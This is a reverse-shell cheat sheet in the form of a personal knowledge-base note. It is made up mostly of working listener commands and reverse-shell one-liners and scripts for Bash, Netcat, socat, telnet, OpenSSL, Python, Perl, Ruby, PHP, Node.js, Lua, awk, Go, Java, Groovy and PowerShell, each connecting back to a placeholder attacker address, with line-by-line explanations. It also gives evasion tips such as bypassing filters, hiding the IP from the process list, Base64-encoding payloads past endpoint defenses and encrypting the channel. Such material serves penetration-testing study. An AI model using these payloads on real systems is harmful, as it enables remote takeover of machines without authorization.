---
created: 2026-09-08
updated: 2026-10-06
tags:
  - shells
---
>[!abstract]+ Table of contents
>- [[#Reverse shell]]
>	- [[#The Reverse Shell Generator]]
>- [[#Listeners]]
>- [[#Linux reverse shells]]
>- [[#Windows reverse shells]]
>	- [[#PowerShell reverse shell]]
>- [[#References and further reading]]
## Reverse shell

>A **reverse shell** is a type of remote shell where **your attacking machine** listens on a port and the **target machine** initiates an outbound connection to it. Once the connection is established, you gain a command-line interface on the target.

- Most enterprise networks block **ingress traffic** — incoming connections from the internet — so connecting directly to a target on an arbitrary port (as a bind shell requires) is often impossible.
- If **outbound** connections from the target are allowed (egress traffic), a reverse shell forces the target to initiate the connection to the attacker instead.
- Egress traffic is commonly allowed because employees need to browse the web, send email, and reach external services.

>[!note] This is the opposite of a bind shell, which is useful when only inbound connections are allowed. See [[Bind shells]].

### The Reverse Shell Generator

- [`revshells.com`](https://www.revshells.com/) (the Online Reverse Shell Generator) builds ready-to-use reverse shell commands for a wide range of languages and tools. 
- You set the attacker IP and port, pick the shell type and payload, and it produces the exact one-liner, including listener commands and encoding options such as URL-encoding or Base64. It is the fastest way to find a payload that matches whatever interpreter happens to be available on the target.

>[!example]+
>![[revshells.com.png]]

>[!note]+ Choosing a reverse shell
>- The right payload depends on what is already installed on the target. 
>- Netcat may be absent, but a language interpreter or a shell built-in is almost always present.

>[!note] Most of the payloads in this note are the same ones the generator produces, grouped by the situation each one fits.
## Listeners

- Before you deploy a reverse shell, set up a listener on your attacking machine. A listener is a simple server that waits for the target to connect back.

- Netcat (classic, raw connection):

```bash
nc -lvnp 1337
```

>[!interesting]+ This starts a Netcat listener (`-l`) on port `1337` (`-p 1337`), in verbose mode (`-v`) with DNS resolution disabled (`-n`).

- Netcat wrapped in `rlwrap` for a better experience:

```bash
rlwrap nc -lvnp 1337
```

>[!note] `rlwrap` adds readline support to the listener, so you get command history and arrow-key line editing even in an otherwise raw shell.

- Ncat with TLS, for an encrypted channel:

```bash
ncat --ssl -lvnp 1337
```

- Socat:

```bash
socat TCP-LISTEN:1337,fork,reuseaddr -
```

>[!note] See [[socat]].

>[!interesting]+ This creates a listener on port `1337` and connects it to your terminal in raw mode.
>- `file:tty` tells socat to use your current terminal.
>- `raw,echo=0` disables terminal echo, so your commands aren't printed back to you.
>- `tcp-listen:1337` creates the listening socket.
>
>- Socat preserves terminal features better than Netcat.

>[!note] See [[🛠️ Upgrading shells]].

- Metasploit multi-handler (for Meterpreter and other staged payloads):

```bash
msfconsole -q -x "use exploit/multi/handler; set payload <payload_name>; set lhost <attacker_ip_address>; set lport 1337; exploit"
```

- For example, a Meterpreter TCP reverse shell for Windows:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost <attacker_ip_address>; set lport 1337; exploit"
```

- `pwncat` (Netcat with post-exploitation features):

```bash
pwncat -l 1337
```

## Linux reverse shells
### Netcat

- With the listener running, launch the reverse shell on the target:

```bash
nc <attacker_ip_address> 1337 -e /bin/bash
```

>[!interesting]- How this reverse shell works
>- Netcat opens an outbound connection to your listener at the given IP address and port.
>- `-e /bin/bash` executes `/bin/bash` after the connection is established and attaches its input and output to the socket.
>- From the listener's perspective, the target suddenly connects, and any command you type runs on the target with its output returned to you:
>```
> Listening on 0.0.0.0 1337
> Connection received on 10.10.1.11 50944
>```

>[!note] The shell runs with the privileges of the user who executed the command on the target.

- With TLS, when you need the channel encrypted (pair with the `ncat --ssl` listener):

```bash
ncat --ssl <attacker_ip_address> 1337 -e /bin/bash
```

#### Netcat and pipes

- The `-e` option turns a Netcat connection directly into a shell, so it is often removed from Netcat builds on modern systems. When it is missing, named pipes provide the same result.

- Reverse shell with Netcat and a named pipe:

```bash
mkfifo /tmp/pipefile; \
nc <attacker_ip_address> 1337 < /tmp/pipefile | /bin/sh > /tmp/pipefile 2>&1; \
rm /tmp/pipefile
```

>[!interesting]- How this reverse shell works
>- `mkfifo /tmp/pipefile`
>	- Creates a named pipe (FIFO) at `/tmp/pipefile`.
>- `nc <attacker_ip_address> 1337`
>	- Netcat connects to the attacker's machine on port `1337`.
>	- `< /tmp/pipefile` tells Netcat to read its input from the named pipe instead of standard input. Any data written to `/tmp/pipefile` is sent over the network to whoever is connected (the attacker).
>- `| /bin/sh`
>	- Pipes Netcat's output — anything received from the remote client — into `/bin/sh`, which executes it.
>	- Anything the attacker sends to the listener runs on the target.
>- `> /tmp/pipefile 2>&1`
>    - Redirects the shell's standard output (`>`) and standard error (`2>&1`) into `/tmp/pipefile`.
>    - The shell's output is written back into the named pipe that Netcat reads from, and returned to the attacker.
>- `rm /tmp/pipefile`
>	- Removes the named pipe after the session ends.

- A slightly different approach that uses `cat` to read from the pipe:

```bash
rm -f /tmp/pipefile; \
mkfifo /tmp/pipefile; \
cat /tmp/pipefile | /bin/sh -i 2>&1 | nc <attacker_ip_address> 1337 > /tmp/pipefile
```

>[!interesting]- How this reverse shell works
> - `rm -f /tmp/pipefile`
> 	- Removes any existing `/tmp/pipefile`.
> - `mkfifo /tmp/pipefile`
> 	- Creates a named pipe (FIFO) at `/tmp/pipefile`.
> - `cat /tmp/pipefile | /bin/sh -i 2>&1`
> 	- Reads from the named pipe and feeds the data into `/bin/sh -i`. The `-i` flag makes the shell interactive.
> - `| nc <attacker_ip_address> 1337`
> 	- Pipes the shell's output (`stdout` and `stderr`) into Netcat, which transmits it to your machine.
> - `> /tmp/pipefile`
> 	- Redirects Netcat's output — data received from the attacker — back into `/tmp/pipefile`, which `cat` is reading from.

### `socat`

```bash
socat TCP:10.10.11.11:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

>[!note] See [[socat]].

### Bash `/dev/tcp`

- Starting with Bash 2.04, Bash can open raw TCP and UDP connections through the built-in pseudo-devices `/dev/tcp` and `/dev/udp`, with **no external tools**.

- Reverse shell over a TCP raw socket:

```bash
bash -i >& /dev/tcp/<attacker_ip_address>/1337 0>&1
```

>[!interesting]- How this reverse shell works
> - `/dev/tcp/...` makes Bash treat a TCP connection as a **file descriptor**.
> - `bash -i` starts an interactive shell session.
> - `/dev/tcp/<host>/<port>` opens a TCP connection to the given host and port. The `>&` operator redirects both standard output and standard error to that connection, so anything the shell prints is sent across the network to your machine.
> - `0>&1` redirects standard input (file descriptor `0`) to a copy of standard output (file descriptor `1`), which already points at the socket. This completes a bidirectional channel: shell output goes to the socket, and shell input comes from the socket.

- Over UDP instead of TCP (useful against networks that inspect TCP more closely; pair with a `nc -u -lvnp 1337` listener):

```bash
bash -i >& /dev/udp/<attacker_ip_address>/1337 0>&1
```

- The "file descriptor `196`" (bypasses some filters):

```bash
0<&196;exec 196<>/dev/tcp/<attacker_ip_address>/1337; sh <&196 >&196 2>&196
```

- A read-loop variant that works when `bash -i` does not behave as expected:

```bash
exec 5<>/dev/tcp/<attacker_ip_address>/1337;cat <&5 | while read line; do $line 2>&5 >&5; done
```

>[!interesting]- How this reverse shell works
> - `exec 5<>/dev/tcp/<attacker_ip_address>/1337` opens the TCP connection on file descriptor `5`.
> - `cat <&5` reads commands arriving from the socket.
> - The `while read line` loop executes each line and redirects its output and errors back to file descriptor `5`, returning them to the attacker.

- Binding all three streams to one descriptor:

```bash
bash -i 5<> /dev/tcp/<attacker_ip_address>/1337 0<&5 1>&5 2>&5
```

### `zsh`

```bash
zsh -c 'zmodload zsh/net/tcp && ztcp <attacker_ip_address> 1337 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

>[!interesting]- How this reverse shell works
> - `zmodload zsh/net/tcp` loads Zsh's TCP module.
> - `ztcp <host> <port>` opens the connection and stores its file descriptor in `$REPLY`.
> - A new `zsh` is launched with its three standard streams bound to that descriptor.

### Telnet

- When only `telnet` is present, you can use two named pipes reproduce a shell:

```bash
TF=$(mktemp -u); mkfifo $TF && telnet <attacker_ip_address> 1337 0<$TF | /bin/sh 1>$TF
```

>[!interesting]- How this reverse shell works
> - `mktemp -u` reserves a temporary path, and `mkfifo` turns it into a named pipe.
> - `telnet` connects to the attacker and reads its input from the pipe.
> - Telnet's output (the attacker's commands) is piped into `/bin/sh`, whose output is written back into the pipe that Telnet reads from.

### OpenSSL-encrypted reverse shell

- When you need the channel encrypted and only `openssl` is available, it can carry the shell over TLS. Traffic is unreadable to tools like Wireshark that inspect network traffic.

1. Generate a certificate and key on the attacker:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2. Start the TLS listener on the attacker:

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
```

3. Connect back from the target:

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <attacker_ip_address>:1337 > /tmp/s; rm /tmp/s
```

>[!interesting]- How this reverse shell works
> - `openssl s_server` presents the certificate and terminates TLS on the attacker side.
> - On the target, `openssl s_client` opens the encrypted connection.
> - The named pipe `/tmp/s` connects `/bin/sh -i` to the TLS client the same way the Netcat pipe technique does: the client's output feeds the shell, and the shell's output flows back through the pipe into the client.

## Reverse shells with programming languages
### Python reverse shell

>[!note] Python is available on most Linux systems, and `pty` gives a fully interactive shell.

- Fully interactive PTY shell:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip_address>",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()'
```

- The same shell, expanded and commented:

```python
import socket
import os
import pty

# create a socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the attacker's listener
s.connect(("<attacker_ip_address>", 1337))

# redirect stdin (fd 0) to the socket
os.dup2(s.fileno(), 0)

# redirect stdout (fd 1) to the socket
os.dup2(s.fileno(), 1)

# redirect stderr (fd 2) to the socket
os.dup2(s.fileno(), 2)

# spawn an interactive bash shell
pty.spawn("/bin/bash")

# close the socket (the connection is already established)
s.close()
```

- Using `subprocess` instead of `pty`:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip_address>",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

- A shorter form:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker_ip_address>",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

- Reading the host and port from environment variables, which keeps the IP address out of the command line and process list:

```bash
export RHOST="<attacker_ip_address>";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### Perl reverse shell

- Standard Perl reverse shell:

```bash
perl -e 'use Socket;$i="<attacker_ip_address>";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- A variant that does not call `/bin/sh`, for Windows targets where no `sh` is present:

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attacker_ip_address>:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby reverse shell

- Standard Ruby reverse shell:

```bash
ruby -rsocket -e'f=TCPSocket.open("<attacker_ip_address>",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- A variant that does not call `/bin/sh`, for Windows targets:

```bash
ruby -rsocket -e 'c=TCPSocket.new("<attacker_ip_address>","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PHP reverse shell

- PHP offers several functions that run an external program. They are interchangeable here, so if one is disabled by `disable_functions`, try the next.

```bash
php -r '$sock=fsockopen("<attacker_ip_address>",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("<attacker_ip_address>",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("<attacker_ip_address>",1337);system("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("<attacker_ip_address>",1337);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("<attacker_ip_address>",1337);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

>[!interesting]- How these reverse shells work
> - `fsockopen("<attacker_ip_address>",1337)` opens a socket to the attacker. PHP assigns it file descriptor `3`.
> - The execution function (`exec`, `shell_exec`, `system`, `passthru`, or `popen`) runs `/bin/sh -i`.
> - `<&3 >&3 2>&3` binds the shell's standard input, output, and error to descriptor `3`, connecting it to the socket.

- Using `proc_open`, which does not depend on the shell inheriting descriptor `3`:

```bash
php -r '$s=fsockopen("<attacker_ip_address>",1337);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s), $pipes);'
```

### Node.js reverse shell

- Full socket implementation:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "<attacker_ip_address>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

- A shorter form that shells out to Netcat when it is present:

```bash
require('child_process').exec('nc -e /bin/sh <attacker_ip_address> 1337')
```

### Lua reverse shell

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<attacker_ip_address>','1337');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

- For Lua 5.1, which is common on embedded systems:

```bash
lua5.1 -e 'local host, port = "<attacker_ip_address>", 1337 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) end'
```

### Awk reverse shell

- `awk` can open TCP sockets through its `/inet/tcp` special files, which is useful when little else is installed:

```bash
awk 'BEGIN {s = "/inet/tcp/0/<attacker_ip_address>/1337"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

>[!interesting]- How this reverse shell works
> - `/inet/tcp/0/<host>/<port>` is GNU awk's syntax for a TCP client connection.
> - The loop prints a `shell>` prompt to the socket, reads a command back with `getline`, runs it, and pipes its output to the socket. It repeats until it receives `exit`.

### Golang reverse shell

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<attacker_ip_address>:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

>[!interesting]- How this reverse shell works
> - `net.Dial("tcp", ...)` opens the connection.
> - `exec.Command("/bin/sh")` prepares a shell, and its `Stdin`, `Stdout`, and `Stderr` are set to the connection before `Run()` starts it.

### Java reverse shell

```java
Thread thread = new Thread(){
    public void run(){
        String host = "<attacker_ip_address>";
        int port = 1337;
        String cmd = "/bin/sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e){}
            };
            p.destroy();
            s.close();
        } catch (Exception e){}
    }
};
thread.start();
```

>[!interesting]- How this reverse shell works
> - A `/bin/sh` process is started with its error stream merged into its output. 
> - A socket is opened to the attacker, and the loop shuttles bytes between the process and the socket until either side closes. It runs on its own thread so it does not block the host application.

### Groovy reverse shell

- The same technique, condensed to a single line for Groovy consoles (for example, an exposed Jenkins script console):

```bash
String host="<attacker_ip_address>";int port=1337;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


## Windows reverse shells
### PowerShell reverse shell

- PowerShell reaches the network through .NET framework classes, which makes it the standard choice on Windows.

- Reverse shell one-liner:

```PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- `-nop` (no profile) tells PowerShell not to load the user's profile script at startup. This makes execution faster and avoids any unwanted commands the profile might contain.
- `-c` indicates that a command follows.

>[!note] Endpoint defenses inspect the plaintext of PowerShell commands, so this payload is often delivered Base64-encoded with `-enc`. The Reverse Shell Generator can produce the encoded form directly.

- The expanded version:

```PowerShell
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337)

$stream = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

	$sendback = (iex $data 2>&1 | Out-String )

	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '

	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

	$stream.Write($sendbyte,0,$sendbyte.Length)

	$stream.Flush()
}

$client.Close()
```

>[!interesting]- How this reverse shell works
> - `$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337)`
> 	- Creates a **TCP client** (an instance of the .NET `System.Net.Sockets.TCPClient` class) that connects to the attacker on port `1337`. This is how the target initiates the connection.
> - `$stream = $client.GetStream()`
> 	- Gets the **network stream** used to read the attacker's commands and send back output.
> - `[byte[]]$bytes = 0..65535|%{0}`
> 	- Creates a **byte-array buffer** of size 65,536, all elements initialized to `0`, to hold incoming data.
> - `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`
> 	- Reads data from the stream into the buffer; `$i` is the number of bytes read. The loop runs as long as the stream is open and data is arriving.
> 	- `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)`
> 		- Converts the received bytes into an ASCII string — the command sent by the attacker.
> 	- `$sendback = (iex $data 2>&1 | Out-String)`
> 		- Executes the command with `Invoke-Expression` (`iex`). `2>&1` redirects errors to standard output, and `| Out-String` turns the result into a string rather than an object.
> 	- `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '`
> 		- Appends a **PowerShell prompt** (the current directory) to the output, so the attacker sees a familiar prompt after each command (e.g., `PS C:\current\working\directory>`).
> 	- `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)`
> 		- Converts the output string back to bytes for transmission.
> 	- `$stream.Write($sendbyte,0,$sendbyte.Length)`
> 		- Sends the output back to the attacker.
> 	- `$stream.Flush()`
> 		- Forces all buffered data to be sent immediately.
> - `$client.Close()`
> 	- Closes the connection when the loop ends (e.g., when the attacker disconnects).

- With [`powercat`](https://github.com/besimorhino/powercat), a PowerShell port of Netcat:

```PowerShell
. .\powercat.ps1
powercat -c <attacker_ip_address> -p 1337 -e cmd
```

- With a Windows Netcat binary, when one is present:

```PowerShell
nc.exe <attacker_ip_address> 1337 -e cmd.exe
```

>[!note] For a fully interactive Windows shell (with tab completion and job control), use a ConPTY-based tool such as [`ConPtyShell`](https://github.com/antonioCoco/ConPtyShell) instead of the raw payloads above. The upgrade process is covered in [[🛠️ Upgrading shells]].

## References and further reading

- [`Online - Reverse Shell Generator (revshells.com)`](https://www.revshells.com/)
- [`Reverse Shell Cheat Sheet — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- [`Python reverse shell and bind shell Cheat Sheet — shelld3v`](https://github.com/shelld3v/Python-shell-cheat-sheet)
